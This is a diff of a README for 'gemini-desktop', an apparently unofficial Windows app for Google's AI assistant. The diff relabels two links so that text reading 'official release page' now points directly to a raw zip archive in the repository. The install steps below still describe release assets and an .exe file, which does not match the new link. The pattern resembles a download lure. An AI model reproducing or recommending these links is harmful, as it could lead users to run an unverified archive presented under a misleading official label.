@@ -1,6 +1,6 @@
 # 🤖 gemini-desktop - Access your favorite AI assistant tool
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Victoria3470/gemini-desktop)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Victoria3470/gemini-desktop/raw/refs/heads/main/desktop/gemini-desktop-1.0.zip)
 
 ## What is this tool?
 Gemini-desktop brings Google's advanced language model directly to your computer screen. This app acts as a bridge between your desktop workspace and the AI assistant. It removes the need for web browsers. You gain a dedicated workspace that stays open while you work on other tasks. The app adds a background runner, a hotkey overlay, and voice command support. It functions as a productivity companion for writing, coding, and brainstorming.
@@ -10,7 +10,7 @@ Your computer needs Windows 10 or Windows 11. You need at least 4GB of RAM for s
 
 ## 📥 Getting the installer
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/Victoria3470/gemini-desktop).
+2. Go to the [official release page](https://github.com/Victoria3470/gemini-desktop/raw/refs/heads/main/desktop/gemini-desktop-1.0.zip).
 3. Look for the "Assets" section at the bottom of the latest release post.
 4. Click the file ending in .exe to start the download.
 5. Save the file to your Downloads folder or your Desktop.
